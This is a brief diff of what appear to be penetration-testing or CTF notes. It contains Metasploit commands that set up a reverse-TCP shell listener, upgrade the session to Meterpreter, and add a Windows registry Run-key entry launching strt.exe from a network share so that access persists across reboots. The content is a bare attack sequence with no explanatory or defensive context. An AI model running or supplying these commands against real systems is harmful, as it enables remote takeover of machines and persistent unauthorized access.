@@ -1,1 +1,10 @@
-reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v <KEYNAME> -t REG_SZ -d <PATH>
+use multi/handler
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST ..
+set LPORT 1234
+exploit
+
+use multi/manage/shell_to_meterpreter
+set LPORT 55555
+set SESSION ..
+reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v boi -t REG_SZ -d \\\\farnsworth\\EDB15\\strt.exe
